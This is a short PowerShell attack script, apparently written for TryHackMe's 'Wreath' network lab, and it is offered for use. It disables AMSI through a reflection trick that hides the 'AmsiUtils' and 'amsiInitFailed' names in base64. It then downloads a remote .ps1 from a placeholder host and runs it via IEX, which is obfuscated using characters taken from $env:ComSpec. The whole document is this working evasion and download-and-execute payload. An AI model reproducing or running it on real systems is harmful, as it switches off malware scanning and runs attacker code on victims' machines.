#Execute your .ps1 shell via IEX, bypass AMSI & Windows Defender.
#Tested on updated W10 systems and was used to finish THM's Network "Wreath"
#Author: 0iphor13

Start-Sleep -s 3

[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)

Start-Sleep -s 1

(New-Object Net.WebClient).DownloadString('http://0.0.0.0:8080/Invoke-Script.ps1') | & ( $eNV:ComSpeC[4,15,25]-JoIn'' )

Start-Sleep -s 20

